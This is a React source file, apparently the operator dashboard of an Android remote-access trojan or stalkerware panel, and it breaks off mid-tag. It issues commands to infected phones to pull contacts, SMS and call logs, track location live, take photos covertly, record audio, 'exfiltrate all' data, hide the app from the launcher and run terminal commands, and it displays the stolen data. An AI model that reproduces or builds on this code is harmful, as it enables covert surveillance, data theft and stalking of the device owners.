import React, { useState, useEffect, useRef } from "react";
import { useParams, useNavigate } from "react-router-dom";
import axios from "axios";
import io from "socket.io-client";
import toast from "react-hot-toast";
import {
  FiArrowLeft,
  FiCamera,
  FiMapPin,
  FiMessageSquare,
  FiPhone,
  FiUsers,
  FiFolder,
  FiBell,
  FiMic,
  FiSmartphone,
  FiBattery,
  FiGlobe,
  FiClock,
  FiSend,
  FiTrash2,
  FiRefreshCw,
  FiDownload,
  FiEye,
  FiEyeOff,
  FiLink,
  FiPhoneCall,
  FiFileText,
  FiCopy,
  FiWifi,
  FiShield,
  FiPower,
  FiTarget,
  FiTerminal,
  FiSearch,
  FiImage,
  FiVideo,
  FiX,
  FiDelete,
  FiExternalLink,
} from "react-icons/fi";

const API = import.meta.env.VITE_API_URL || "http://localhost:5000";
const WS_URL = import.meta.env.VITE_API_URL || "http://localhost:5000";

const tabs = [
  { id: "overview", label: "Overview", icon: FiSmartphone },
  { id: "contacts", label: "Contacts", icon: FiUsers },
  { id: "sms", label: "SMS", icon: FiMessageSquare },
  { id: "calls", label: "Call Logs", icon: FiPhone },
  { id: "location", label: "Location", icon: FiMapPin },
  { id: "photos", label: "Photos", icon: FiImage },
  { id: "videos", label: "Videos", icon: FiVideo },
  { id: "files", label: "Files", icon: FiFolder },
  { id: "apps", label: "Apps", icon: FiSmartphone },
  { id: "camera", label: "Camera", icon: FiCamera },
  { id: "audio", label: "Audio", icon: FiMic },
  { id: "notifications", label: "Notifications", icon: FiBell },
  { id: "wifi", label: "WiFi", icon: FiWifi },
  { id: "accounts", label: "Accounts", icon: FiUsers },
  { id: "terminal", label: "Terminal", icon: FiTerminal },
];

const quickActions = [
  { id: "get_contacts", label: "Get Contacts", icon: FiUsers, color: "blue" },
  { id: "get_sms", label: "Get SMS", icon: FiMessageSquare, color: "green" },
  {
    id: "get_call_logs",
    label: "Get Call Logs",
    icon: FiPhone,
    color: "purple",
  },
  { id: "get_location", label: "Get Location", icon: FiMapPin, color: "red" },
  {
    id: "take_photo_back",
    label: "Back Camera",
    icon: FiCamera,
    color: "indigo",
  },
  {
    id: "take_photo_front",
    label: "Front Camera",
    icon: FiCamera,
    color: "pink",
  },
  { id: "record_audio", label: "Record Audio", icon: FiMic, color: "orange" },
  {
    id: "get_device_info",
    label: "Device Info",
    icon: FiSmartphone,
    color: "cyan",
  },
  {
    id: "refresh_data",
    label: "Refresh Data",
    icon: FiRefreshCw,
    color: "teal",
  },
  {
    id: "exfiltrate_all",
    label: "Exfiltrate All",
    icon: FiDownload,
    color: "pink",
  },
];

export default function DeviceDetails() {
  const { deviceId } = useParams();
  const navigate = useNavigate();
  const [device, setDevice] = useState(null);
  const [activeTab, setActiveTab] = useState("overview");
  const [loading, setLoading] = useState(true);
  const [commands, setCommands] = useState([]);
  const [terminalInput, setTerminalInput] = useState("");
  const [terminalOutput, setTerminalOutput] = useState([]);
  const [socket, setSocket] = useState(null);
  const terminalRef = useRef(null);

  // Search/filter states
  const [contactSearch, setContactSearch] = useState("");
  const [smsSearch, setSmsSearch] = useState("");
  const [callSearch, setCallSearch] = useState("");

  // Photo viewer & camera toggle
  const [selectedPhoto, setSelectedPhoto] = useState(null);
  const [activePhotoBtn, setActivePhotoBtn] = useState("back");

  useEffect(() => {
    fetchDevice();
    const s = io(WS_URL, {
      auth: { token: localStorage.getItem("token") },
    });
    setSocket(s);

    s.on("device:data", (data) => {
      if (data.deviceId === deviceId) fetchDevice();
    });
    s.on("device:data:update", (data) => {
      if (data.deviceId === deviceId) fetchDevice();
    });
    s.on("command:sent", (data) => {
      if (data.deviceId === deviceId) {
        setCommands((prev) => [data, ...prev]);
        toast.success(`Command sent: ${data.type}`);
      }
    });

    return () => s.close();
  }, [deviceId]);

  const fetchDevice = async () => {
    try {
      const token = localStorage.getItem("token");
      const res = await axios.get(`${API}/api/devices/${deviceId}`, {
        headers: { Authorization: `Bearer ${token}` },
      });
      setDevice(res.data);
      setCommands(res.data.commands?.slice(-50).reverse() || []);
    } catch (err) {
      toast.error("Access denied or device not found");
      navigate("/devices");
    } finally {
      setLoading(false);
    }
  };

  const sendCommand = (type, params = {}) => {
    if (!socket) return;
    socket.emit("command:send", { deviceId, type, params });
  };

  const sendImmediateCommand = (type, params = {}) => {
    if (!socket) return;
    socket.emit("command:send:immediate", { deviceId, type, params });
    addTerminalOutput(`> ${type} ${JSON.stringify(params)}`);
  };

  const addTerminalOutput = (text) => {
    setTerminalOutput((prev) => [
      ...prev,
      { text, time: new Date().toLocaleTimeString() },
    ]);
    setTimeout(() => {
      terminalRef.current?.scrollTo(0, terminalRef.current.scrollHeight);
    }, 100);
  };

  const handleTerminalCommand = (e) => {
    e.preventDefault();
    if (!terminalInput.trim()) return;
    let [cmd, ...args] = terminalInput.trim().split(" ");
    let params = {};
    try {
      if (args.length > 0) params = JSON.parse(args.join(" "));
    } catch {
      params = { value: args.join(" ") };
    }
    sendImmediateCommand(cmd, params);
    setTerminalInput("");
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    toast.success("Copied to clipboard");
  };

  // Delete media from Cloudinary
  const deleteMedia = async (type, publicId) => {
    try {
      const token = localStorage.getItem("token");
      await axios.delete(`${API}/api/media/${deviceId}/${type}`, {
        headers: { Authorization: `Bearer ${token}` },
        data: { publicId },
      });
      toast.success("Deleted from Cloudinary");
      fetchDevice();
    } catch (err) {
      toast.error("Delete failed");
    }
  };

  // Delete all media of a type
  const deleteAllMedia = async (type) => {
    if (!confirm(`Delete all ${type}? This will also delete from Cloudinary.`))
      return;
    try {
      const token = localStorage.getItem("token");
      await axios.delete(`${API}/api/media/${deviceId}/${type}`, {
        headers: { Authorization: `Bearer ${token}` },
      });
      toast.success("All deleted from Cloudinary");
      fetchDevice();
    } catch (err) {
      toast.error("Delete failed");
    }
  };

  // Delete entire device
  const deleteDevice = async () => {
    if (!confirm("Delete this device and all its data? This cannot be undone."))
      return;
    try {
      const token = localStorage.getItem("token");
      await axios.delete(`${API}/api/devices/${deviceId}`, {
        headers: { Authorization: `Bearer ${token}` },
      });
      toast.success("Device deleted");
      navigate("/devices");
    } catch (err) {
      toast.error(
        "Delete failed: " + (err.response?.data?.error || err.message)
      );
    }
  };

  // Delete all data of a type (contacts, sms, callLogs, etc.)
  const deleteAllDataType = async (dataType, label) => {
    if (!confirm(`Delete all ${label} data? This cannot be undone.`)) return;
    try {
      const token = localStorage.getItem("token");
      await axios.delete(`${API}/api/devices/${deviceId}/data/${dataType}`, {
        headers: { Authorization: `Bearer ${token}` },
      });
      toast.success(`All ${label} deleted`);
      fetchDevice();
    } catch (err) {
      toast.error(
        "Delete failed: " + (err.response?.data?.error || err.message)
      );
    }
  };

  // Delete single data item by id
  const deleteDataItem = async (dataType, itemId) => {
    try {
      const token = localStorage.getItem("token");
      await axios.delete(
        `${API}/api/devices/${deviceId}/data/${dataType}/${itemId}`,
        {
          headers: { Authorization: `Bearer ${token}` },
        }
      );
      toast.success("Item deleted");
      fetchDevice();
    } catch (err) {
      toast.error(
        "Delete failed: " + (err.response?.data?.error || err.message)
      );
    }
  };

  const openInGoogleMaps = (lat, lng) => {
    window.open(`https://www.google.com/maps?q=${lat},${lng}`, "_blank");
  };

  if (loading) {
    return (
      <div className="flex items-center justify-center h-96">
        <FiRefreshCw className="text-4xl text-primary-400 animate-spin" />
      </div>
    );
  }

  if (!device) return null;

  const data = device.data || {};

  const StatusBadge = () => (
    <span
      className={`px-3 py-1.5 rounded-full text-xs font-medium flex items-center gap-2 ${
        device.status === "online"
          ? "bg-green-500/10 text-green-400 border border-green-500/20"
          : "bg-dark-600/50 text-dark-400 border border-dark-600/30"
      }`}
    >
      <span
        className={`w-2 h-2 rounded-full ${
          device.status === "online"
            ? "bg-green-400 animate-pulse"
            : "bg-dark-500"
        }`}
      />
      {device.status}
    </span>
  );

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-4">
          <button
            onClick={() => navigate("/devices")}
            className="p-2 rounded-xl hover:bg-dark-700/50 transition-all"
          >
            <FiArrowLeft className="text-xl" />
          </button>
          <div>
            <div className="flex items-center gap-3">
              <h1 className="text-2xl font-bold">
                {device.alias || device.deviceModel || "Unknown Device"}
              </h1>
              <StatusBadge />
            </div>
            <p className="text-dark-400 text-sm mt-1">
              {device.deviceId} · {device.ip}
            </p>
          </div>
        </div>
        <div className="flex items-center gap-3">
          <button
            onClick={fetchDevice}
            className="p-2 rounded-xl hover:bg-dark-700/50 transition-all"
            title="Refresh"
          >
            <FiRefreshCw className="text-lg" />
          </button>
          <button
            onClick={() => sendCommand("hide_app")}
            className="p-2 rounded-xl hover:bg-dark-700/50 transition-all"
            title="Hide app from launcher"
          >
            <FiEyeOff className="text-lg" />
          </button>
          <button
            onClick={() => sendCommand("unhide_app")}
            className="p-2 rounded-xl hover:bg-dark-700/50 transition-all"
            title="Unhide app in launcher"
          >
            <FiEye className="text-lg" />
          </button>
          <button
            onClick={deleteDevice}
            className="p-2 rounded-xl bg-red-500/20 text-red-400 hover:bg-red-500/30 transition-all"
            title="Delete device and all data"
          >
            <FiTrash2 className="text-lg" />
          </button>
        </div>
      </div>

      {/* Quick Actions */}
      <div className="glass-effect rounded-2xl p-4">
        <div className="flex gap-3 overflow-x-auto pb-2">
          {quickActions.map((action) => {
            const Icon = action.icon;
            const colorMap = {
              blue: "from-blue-500 to-blue-600 border-blue-500/30",
              green: "from-green-500 to-green-600 border-green-500/30",
              purple: "from-purple-500 to-purple-600 border-purple-500/30",
              red: "from-red-500 to-red-600 border-red-500/30",
              indigo: "from-indigo-500 to-indigo-600 border-indigo-500/30",
              orange: "from-orange-500 to-orange-600 border-orange-500/30",
              cyan: "from-cyan-500 to-cyan-600 border-cyan-500/30",
              pink: "from-pink-500 to-pink-600 border-pink-500/30",
            };
            return (
              <button
                key={action.id}
                onClick={() => sendCommand(action.id)}
                className="flex-shrink-0 flex flex-col items-center gap-2 p-3 rounded-xl bg-dark-700/30 border border-dark-600/50 hover:border-primary-500/30 transition-all card-hover"
              >
                <div
                  className={`w-10 h-10 rounded-lg bg-gradient-to-br ${
                    colorMap[action.color]
                  } flex items-center justify-center`}
                >
                  <Icon className="text-white" />
                </div>
                <span className="text-xs whitespace-nowrap">
                  {action.label}
                </span>
              </button>
            );
          })}
        </div>
      </div>

      {/* Tabs */}
      <div className="flex gap-1 p-1 glass-effect rounded-xl overflow-x-auto">
        {tabs.map((tab) => {
          const Icon = tab.icon;
          return (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              className={`flex items-center gap-2 px-4 py-2.5 rounded-lg text-sm font-medium whitespace-nowrap transition-all ${
                activeTab === tab.id
                  ? "bg-primary-500/20 text-primary-400 border border-primary-500/30"
                  : "text-dark-400 hover:text-white hover:bg-dark-700/50"
              }`}
            >
              <Icon className="text-sm" />
              {tab.label}
            </button>
          );
        })}
      </div>

      {/* Tab Content */}
      <div className="min-h-[400px]">
        {/* ===== OVERVIEW ===== */}
        {activeTab === "overview" && (
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            <div className="lg:col-span-2 glass-effect rounded-2xl p-6">
              <h3 className="text-lg font-semibold mb-4">Device Information</h3>
              <div className="grid grid-cols-2 gap-4">
                {[
                  {
                    label: "Model",
                    value: `${device.manufacturer || ""} ${
                      device.deviceModel || ""
                    }`,
                  },
                  {
                    label: "OS",
                    value: `${device.os || ""} ${device.osVersion || ""}`,
                  },
                  { label: "IP Address", value: device.ip || "Unknown" },
                  { label: "Country", value: device.country || "Unknown" },
                  { label: "City", value: device.city || "Unknown" },
                  {
                    label: "Battery",
                    value:
                      device.batteryLevel != null
                        ? `${device.batteryLevel}%`
                        : "Unknown",
                  },
                  {
                    label: "First Seen",
                    value: device.firstSeen
                      ? new Date(device.firstSeen).toLocaleString()
                      : "Unknown",
                  },
                  {
                    label: "Last Seen",
                    value: device.lastSeen
                      ? new Date(device.lastSeen).toLocaleString()
                      : "Never",
                  },
                  { label: "Hidden", value: device.isHidden ? "Yes" : "No" },
                  {
                    label: "APK Version",
                    value: device.apkVersion || "Unknown",
                  },
                ].map((info) => (
                  <div
                    key={info.label}
                    className="p-3 rounded-xl bg-dark-700/30"
                  >
                    <p className="text-xs text-dark-400">{info.label}</p>
                    <p className="font-medium mt-0.5">{info.value}</p>
                  </div>
                ))}
              </div>
            </div>

            <div className="glass-effect rounded-2xl p-6">
              <h3 className="text-lg font-semibold mb-4">Permissions</h3>
              <div className="space-y-3">
                {[
                  { key: "camera", label: "Camera", icon: FiCamera },
                  { key: "location", label: "Location", icon: FiMapPin },
                  { key: "sms", label: "SMS", icon: FiMessageSquare },
                  { key: "contacts", label: "Contacts", icon: FiUsers },
                  { key: "storage", label: "Storage", icon: FiFolder },
                  { key: "microphone", label: "Microphone", icon: FiMic },
                  { key: "phone", label: "Phone", icon: FiPhone },
                  {
                    key: "notifications",
                    label: "Notifications",
                    icon: FiBell,
                  },
                ].map((perm) => {
                  const Icon = perm.icon;
                  const granted = device.permissions?.[perm.key];
                  return (
                    <div
                      key={perm.key}
                      className="flex items-center justify-between p-2 rounded-lg bg-dark-700/30"
                    >
                      <div className="flex items-center gap-2">
                        <Icon
                          className={`text-sm ${
                            granted ? "text-green-400" : "text-dark-500"
                          }`}
                        />
                        <span className="text-sm">{perm.label}</span>
                      </div>
                      <span
                        className={`text-xs ${
                          granted ? "text-green-400" : "text-dark-500"
                        }`}
                      >
                        {granted ? "Granted" : "Not Available"}
                      </span>
                    </div>
                  );
                })}
              </div>
            </div>

            <div className="lg:col-span-3 glass-effect rounded-2xl p-6">
              <h3 className="text-lg font-semibold mb-4">
                Recent Commands
                {commands.filter((c) => c.status === "failed").length > 0 && (
                  <span className="ml-2 px-2 py-0.5 rounded-full bg-red-500/20 text-red-400 text-xs">
                    {commands.filter((c) => c.status === "failed").length}{" "}
                    failed
                  </span>
                )}
              </h3>
              <div className="space-y-2 max-h-96 overflow-y-auto">
                {commands.length === 0 ? (
                  <p className="text-dark-400 text-center py-8">
                    No commands executed yet
                  </p>
                ) : (
                  commands.map((cmd, i) => {
                    const hasError =
                      cmd.status === "failed" &&
                      cmd.result &&
                      (cmd.result.error || cmd.result.errorType);
                    return (
                      <div key={cmd.commandId || i}>
                        <div
                          className={`flex items-center justify-between p-3 rounded-xl cursor-pointer transition-all ${
                            hasError
                              ? "bg-red-900/20 border border-red-500/20 hover:bg-red-900/30"
                              : "bg-dark-700/30 hover:bg-dark-700/50"
                          }`}
                          onClick={() => {
                            if (hasError) {
                              const el = document.getElementById(
                                `cmd-error-${cmd.commandId || i}`
                              );
                              if (el) el.classList.toggle("hidden");
                            }
                          }}
                        >
                          <div className="flex items-center gap-3 flex-1 min-w-0">
                            <span
                              className={`w-2 h-2 rounded-full flex-shrink-0 ${
                                cmd.status === "executed"
                                  ? "bg-green-400"
                                  : cmd.status === "failed"
                                  ? "bg-red-400"
                                  : cmd.status === "pending"
                                  ? "bg-yellow-400"
                                  : "bg-dark-500"
                              }`}
                            />
                            <span className="text-sm font-medium truncate">
                              {cmd.type}
                            </span>
                            <span className="text-xs text-dark-400 flex-shrink-0">
                              {cmd.createdAt
                                ? new Date(cmd.createdAt).toLocaleTimeString()
                                : ""}
                            </span>
                            {hasError && (
                              <span className="text-xs text-red-400 ml-2 flex-shrink-0">
                                {cmd.result.errorType || "Error"}
                              </span>
                            )}
                          </div>
                          <div className="flex items-center gap-2 flex-shrink-0">
                            {cmd.result?.error && (
                              <button
                                onClick={(e) => {
                                  e.stopPropagation();
                                  copyToClipboard(cmd.result.error);
                                }}
                                className="p-1 rounded hover:bg-dark-600/50 text-dark-400"
                                title="Copy error"
                              >
                                <FiCopy className="text-xs" />
                              </button>
                            )}
                            <span
                              className={`text-xs ${
                                cmd.status === "failed"
                                  ? "text-red-400"
                                  : "text-dark-400"
                              }`}
                            >
                              {cmd.status}
                            </span>
                          </div>
                        </div>
                        {hasError && (
                          <div
                            id={`cmd-error-${cmd.commandId || i}`}
                            className="hidden mt-1 mb-2 ml-5 p-3 rounded-lg bg-red-950/40 border border-red-500/10"
                          >
                            <p className="text-xs text-red-300 font-mono whitespace-pre-wrap break-all">
                              <span className="text-red-400 font-bold">
                                Error:
                              </span>{" "}
                              {cmd.result.error}
                            </p>
                            {cmd.result.errorType && (
                              <p className="text-xs text-red-400/80 font-mono mt-1">
                                <span className="text-red-400 font-bold">
                                  Type:
                                </span>{" "}
                                {cmd.result.errorType}
                              </p>
                            )}
                            {cmd.result.stackTrace && (
                              <details className="mt-1">
                                <summary className="text-xs text-red-400/60 cursor-pointer hover:text-red-400">
                                  Stack trace
                                </summary>
                                <pre className="text-xs text-red-300/60 font-mono mt-1 whitespace-pre-wrap">
                                  {cmd.result.stackTrace}
                                </pre>
                              </details>
                            )}
                          </div>
                        )}
                      </div>
                    );
                  })
                )}
              </div>
            </div>
          </div>
        )}

        {/* ===== CONTACTS ===== */}
        {activeTab === "contacts" && (
          <div className="glass-effect rounded-2xl p-6">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-lg font-semibold">
                Contacts{" "}
                {(data.contacts || []).length > 0 &&
                  `(${data.contacts.length})`}
              </h3>
              <div className="flex gap-2">
                <div className="relative">
                  <FiSearch className="absolute left-3 top-1/2 -translate-y-1/2 text-dark-400" />
                  <input
                    type="text"
                    placeholder="Search contacts..."
                    value={contactSearch}
                    onChange={(e) => setContactSearch(e.target.value)}
                    className="pl-10 pr-4 py-2 rounded-xl bg-dark-700/50 border border-dark-600/50 text-sm focus:outline-none focus:border-primary-500/50 w-64"
                  />
                </div>
                <button
                  onClick={() => sendCommand("get_contacts")}
                  className="flex items-center gap-2 px-4 py-2 rounded-xl bg-primary-500/10 text-primary-400 border border-primary-500/30 hover:bg-primary-500/20 transition-all text-sm"
                >
                  <FiRefreshCw className="text-sm" /> Refresh
                </button>
              </div>
            </div>
            {(() => {
              const contacts = data.contacts || [];
              const filtered = contactSearch
                ? contacts.filter(
                    (c) =>
                      (c.name || "")
                        .toLowerCase()
                        .includes(contactSearch.toLowerCase()) ||
                      (c.phones || []).some((p) =>
                        (p.number || "").includes(contactSearch)
                      )
                  )
                : contacts;
              return filtered.length > 0 ? (
                <div className="space-y-2 max-h-96 overflow-y-auto">
                  {filtered.map((contact, i) => (
                    <div
                      key={contact.id || i}
                      className="flex items-center justify-between p-3 rounded-xl bg-dark-700/30 hover:bg-dark-700/50 transition-all"
                    >
                      <div>
                        <p className="font-medium">
                          {contact.name || "Unknown"}
                        </p>
                        <p className="text-xs text-dark-400">
                          {(contact.phones || [])
                            .map((p) => p.number)
                            .join(", ")}
                        </p>
                        {contact.emails && contact.emails.length > 0 && (
                          <p className="text-xs text-dark-500">
                            {contact.emails.join(", ")}
                          </p>
                        )}
                      </div>
                      <button
                        onClick={() =>
                          copyToClipboard(JSON.stringify(contact, null, 2))
                        }
                        className="p-2 rounded-lg hover:bg-dark-600/50 transition-all text-dark-400"
                      >
                        <FiCopy className="text-sm" />
                      </button>
                    </div>
                  ))}
                </div>
              ) : (
                <div className="text-center py-12 text-dark-400">
                  <FiUsers className="text-4xl mx-auto mb-3 opacity-50" />
                  <p>
                    {contactSearch
                      ? "No contacts match your search"
                      : "No contacts data available"}
                  </p>
                  <button
                    onClick={() => sendCommand("get_contacts")}
                    className="mt-4 text-sm text-primary-400 hover:text-primary-300"
                  >
                    Fetch contacts now
                  </button>
                </div>
              );
            })()}
          </div>
        )}

        {/* ===== SMS ===== */}
        {activeTab === "sms" && (
          <div className="glass-effect rounded-2xl p-6">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-lg font-semibold">
                SMS Messages{" "}
                {(data.sms || []).length > 0 && `(${data.sms.length})`}
              </h3>
              <div className="flex gap-2">
                <div className="relative">
                  <FiSearch className="absolute left-3 top-1/2 -translate-y-1/2 text-dark-400" />
                  <input
                    type="text"
                    placeholder="Search SMS..."
                    value={smsSearch}
                    onChange={(e) => setSmsSearch(e.target.value)}
                    className="pl-10 pr-4 py-2 rounded-xl bg-dark-700/50 border border-dark-600/50 text-sm focus:outline-none focus:border-primary-500/50 w-64"
                  />
                </div>
                <button
                  onClick={() => sendCommand("get_sms")}
                  className="flex items-center gap-2 px-4 py-2 rounded-xl bg-primary-500/10 text-primary-400 border border-primary-500/30 hover:bg-primary-500/20 transition-all text-sm"
                >
                  <FiRefreshCw className="text-sm" /> Refresh
                </button>
              </div>
            </div>
            {(() => {
              const sms = data.sms || [];
              const filtered = smsSearch
                ? sms.filter(
                    (m) =>
                      (m.address || "")
                        .toLowerCase()
                        .includes(smsSearch.toLowerCase()) ||
                      (m.body || "")
                        .toLowerCase()
                        .includes(smsSearch.toLowerCase())
                  )
                : sms;
              return filtered.length > 0 ? (
                <div className="space-y-2 max-h-96 overflow-y-auto">
                  {filtered.map((msg, i) => (
                    <div
                      key={msg.id || i}
                      className={`p-3 rounded-xl ${
                        msg.type === "inbox"
                          ? "bg-dark-700/30"
                          : "bg-primary-500/5 border border-primary-500/10"
                      }`}
                    >
                      <div className="flex items-center justify-between">
                        <p className="font-medium text-sm">{msg.address}</p>
                        <div className="flex items-center gap-2">
                          <span className="text-xs text-dark-400">
                            {msg.date
                              ? new Date(msg.date).toLocaleString()
                              : ""}
                          </span>
                          <button
                            onClick={() => copyToClipboard(msg.body || "")}
                            className="p-1 rounded hover:bg-dark-600/50 text-dark-400"
                          >
                            <FiCopy className="text-xs" />
                          </button>
                        </div>
                      </div>
                      <p className="text-sm text-dark-300 mt-1">{msg.body}</p>
                    </div>
                  ))}
                </div>
              ) : (
                <div className="text-center py-12 text-dark-400">
                  <FiMessageSquare className="text-4xl mx-auto mb-3 opacity-50" />
                  <p>
                    {smsSearch
                      ? "No SMS match your search"
                      : "No SMS data available"}
                  </p>
                  <button
                    onClick={() => sendCommand("get_sms")}
                    className="mt-4 text-sm text-primary-400 hover:text-primary-300"
                  >
                    Fetch SMS now
                  </button>
                </div>
              );
            })()}
          </div>
        )}

        {/* ===== CALL LOGS ===== */}
        {activeTab === "calls" && (
          <div className="glass-effect rounded-2xl p-6">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-lg font-semibold">
                Call Logs{" "}
                {(data.callLogs || []).length > 0 &&
                  `(${data.callLogs.length})`}
              </h3>
              <div className="flex gap-2">
                <div className="relative">
                  <FiSearch className="absolute left-3 top-1/2 -translate-y-1/2 text-dark-400" />
                  <input
                    type="text"
                    placeholder="Search calls..."
                    value={callSearch}
                    onChange={(e) => setCallSearch(e.target.value)}
                    className="pl-10 pr-4 py-2 rounded-xl bg-dark-700/50 border border-dark-600/50 text-sm focus:outline-none focus:border-primary-500/50 w-64"
                  />
                </div>
                <button
                  onClick={() => sendCommand("get_call_logs")}
                  className="flex items-center gap-2 px-4 py-2 rounded-xl bg-primary-500/10 text-primary-400 border border-primary-500/30 hover:bg-primary-500/20 transition-all text-sm"
                >
                  <FiRefreshCw className="text-sm" /> Refresh
                </button>
              </div>
            </div>
            {(() => {
              const calls = data.callLogs || [];
              const filtered = callSearch
                ? calls.filter(
                    (c) =>
                      (c.name || "")
                        .toLowerCase()
                        .includes(callSearch.toLowerCase()) ||
                      (c.number || "").includes(callSearch)
                  )
                : calls;
              return filtered.length > 0 ? (
                <div className="space-y-2 max-h-96 overflow-y-auto">
                  {filtered.map((call, i) => (
                    <div
                      key={call.id || i}
                      className="flex items-center justify-between p-3 rounded-xl bg-dark-700/30"
                    >
                      <div className="flex items-center gap-3">
                        <span
                          className={`w-2 h-2 rounded-full ${
                            call.type === "Incoming"
                              ? "bg-green-400"
                              : call.type === "Outgoing"
                              ? "bg-blue-400"
                              : call.type === "Missed"
                              ? "bg-red-400"
                              : "bg-yellow-400"
                          }`}
                        />
                        <div>
                          <p className="font-medium text-sm">
                            {call.name || call.number}
                          </p>
                          <p className="text-xs text-dark-400">
                            {call.type} · {call.duration || 0}s
                          </p>
                        </div>
                      </div>
                      <p className="text-xs text-dark-400">
                        {call.date ? new Date(call.date).toLocaleString() : ""}
                      </p>
                    </div>
                  ))}
                </div>
              ) : (
                <div className="text-center py-12 text-dark-400">
                  <FiPhone className="text-4xl mx-auto mb-3 opacity-50" />
                  <p>
                    {callSearch
                      ? "No calls match your search"
                      : "No call log data available"}
                  </p>
                  <button
                    onClick={() => sendCommand("get_call_logs")}
                    className="mt-4 text-sm text-primary-400 hover:text-primary-300"
                  >
                    Fetch call logs now
                  </button>
                </div>
              );
            })()}
          </div>
        )}

        {/* ===== LOCATION ===== */}
        {activeTab === "location" && (
          <div className="glass-effect rounded-2xl p-6">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-lg font-semibold">Location Tracking</h3>
              <div className="flex gap-2">
                <button
                  onClick={() => sendCommand("get_location")}
                  className="flex items-center gap-2 px-4 py-2 rounded-xl bg-primary-500/10 text-primary-400 border border-primary-500/30 hover:bg-primary-500/20 transition-all text-sm"
                >
                  <FiMapPin className="text-sm" /> Get Location
                </button>
                <button
                  onClick={() => sendCommand("continuous_location")}
                  className="flex items-center gap-2 px-4 py-2 rounded-xl bg-green-500/10 text-green-400 border border-green-500/30 hover:bg-green-500/20 transition-all text-sm"
                >
                  <FiTarget className="text-sm" /> Live Track
                </button>
              </div>
            </div>
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
              <div className="lg:col-span-2">
                <div className="h-80 rounded-xl bg-dark-700/50 flex items-center justify-center relative overflow-hidden">
                  {(data.locations || []).length > 0 ? (
                    <div className="w-full h-full relative">
                      <iframe
                        title="Location Map"
                        width="100%"
                        height="100%"
                        frameBorder="0"
                        style={{ border: 0, borderRadius: "0.75rem" }}
                        src={`https://www.openstreetmap.org/export/embed.html?bbox=${
                          data.locations[data.locations.length - 1].lng - 0.01
                        }%2C${
                          data.locations[data.locations.length - 1].lat - 0.01
                        }%2C${
                          data.locations[data.locations.length - 1].lng + 0.01
                        }%2C${
                          data.locations[data.locations.length - 1].lat + 0.01
                        }&layer=mapnik&marker=${
                          data.locations[data.locations.length - 1].lat
                        }%2C${data.locations[data.locations.length - 1].lng}`}
                        allowFullScreen
                      />
                    </div>
                  ) : (
                    <p className="text-dark-400">No location data available</p>
                  )}
                </div>
              </div>
              <div className="space-y-2 max-h-80 overflow-y-auto">
                {(data.locations || [])
                  .slice()
                  .reverse()
                  .map((loc, i) => (
                    <div
                      key={i}
                      className="p-3 rounded-xl bg-dark-700/30 cursor-pointer hover:bg-dark-700/50 transition-all"
                      onClick={() => openInGoogleMaps(loc.lat, loc.lng)}
                    >
                      <p className="text-xs font-mono">
                        {loc.lat?.toFixed(6)}, {loc.lng?.toFixed(6)}
                      </p>
                      <p className="text-xs text-dark-400 mt-1">
                        {loc.timestamp
                          ? new Date(loc.timestamp).toLocaleString()
                          : ""}
                      </p>
                      {loc.address && (
                        <p className="text-xs text-dark-500 mt-1 truncate">
                          {loc.address}
                        </p>
                      )}
                    </div>
                  ))}
              </div>
            </div>
          </div>
        )}

        {/* ===== PHOTOS ===== */}
        {activeTab === "photos" && (
          <div className="glass-effect rounded-2xl p-6">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-lg font-semibold">
                Captured Photos{" "}
                {((data.capturedPhotos || []).length > 0 || data.lastPhoto) &&
                  `(${(data.capturedPhotos || []).length})`}
              </h3>
              <div className="flex gap-2">
                <button
                  onClick={() => sendCommand("take_photo")}
                  className="flex items-center gap-2 px-4 py-2 rounded-xl bg-primary-500/10 text-primary-400 border border-primary-500/30 hover:bg-primary-500/20 transition-all text-sm"
                >
                  <FiCamera className="text-sm" /> Take Photo
                </button>
                {(data.capturedPhotos || []).length > 0 && (
                  <button
                    onClick={() => deleteAllMedia("capturedPhotos")}
                    className="flex items-center gap-2 px-4 py-2 rounded-xl bg-red-500/10 text-red-400 border border-red-500/30 hover:bg-red-500/20 transition-all text-sm"
                  >
                    <FiTrash2 className="text-sm" /> Delete All
                  </button>
                )}
              </div>
            </div>
            {(data.capturedPhotos || []).length > 0 ? (
              <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
                {(data.capturedPhotos || [])
                  .slice()
                  .reverse()
                  .map((photo, i) => (
                    <div key={photo.publicId || i} className="relative group">
                      <img
                        src={photo.url}
                        alt={`Captured ${i}`}
                        className="w-full h-48 object-cover rounded-xl cursor-pointer"
                        onClick={() => setSelectedPhoto(photo.url)}
                      />
                      <div className="absolute inset-0 bg-black/50 opacity-0 group-hover:opacity-100 transition-opacity rounded-xl flex items-center justify-center gap-2">
                        <button
                          onClick={() =>
                            deleteMedia("capturedPhotos", photo.publicId)
                          }
                          className="p-2 bg-red-500/80 rounded-lg hover:bg-red-500 transition-all"
                        >
                          <FiTrash2 className="text-white" />
                        </button>
                        <button
                          onClick={() => window.open(photo.url, "_blank")}
                          className="p-2 bg-white/20 rounded-lg hover:bg-white/30 transition-all"
                        >
                          <FiExternalLink className="text-white" />
                        </button>
                      </div>
                      <p className="text-xs text-dark-400 mt-1">
                        {photo.timestamp
                          ? new Date(photo.timestamp).toLocaleString()
                          : ""}
                      </p>
                    </div>
                  ))}
              </div>
            ) : (
              <div className="text-center py-12 text-dark-400">
                <FiImage className="text-4xl mx-auto mb-3 opacity-50" />
                <p>No photos captured yet</p>
                <button
                  onClick={() => sendCommand("take_photo")}
                  className="mt-4 text-sm text-primary-400 hover:text-primary-300"
                >
                  Take a photo now
                </button>
              </div>
            )}

            {/* Photo viewer modal */}
            {selectedPhoto && (
              <div
                className="fixed inset-0 bg-black/90 z-50 flex items-center justify-center p-8"
                onClick={() => setSelectedPhoto(null)}
              >
                <img
                  src={selectedPhoto}
                  alt="Preview"
                  className="max-w-full max-h-full rounded-xl"
                />
                <button
